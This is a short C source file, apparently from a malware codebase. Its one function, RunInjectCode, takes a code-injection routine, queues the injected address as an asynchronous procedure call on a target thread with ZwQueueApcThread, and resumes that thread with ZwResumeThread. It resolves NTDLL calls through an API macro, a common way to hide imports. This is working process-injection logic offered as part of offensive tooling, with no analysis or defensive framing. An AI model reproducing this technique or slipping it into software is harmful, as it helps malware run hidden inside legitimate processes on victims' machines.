#include <WinSock2.h>
#include "../../include/core/injects.h"
#include "../../include/core/type.h"
#include "../../include/core/winapi_simple.h"
#include "../../include/core/ntdll.h"

bool RunInjectCode( HANDLE hprocess, HANDLE hthread, typeFuncThread startFunc, typeInjectCode func )
{
	SIZE_T addr = func( hprocess, startFunc, 0 );
	if( addr == 0 ) return false;
	bool result = false;
	NTSTATUS status = API(NTDLL, ZwQueueApcThread)( hthread, (PKNORMAL_ROUTINE)addr, NULL, NULL, NULL );
	if( status == STATUS_SUCCESS )
	{
		status = API(NTDLL, ZwResumeThread)( (DWORD)hthread, 0 );
		result = (status == STATUS_SUCCESS);
	}
	return result;
}
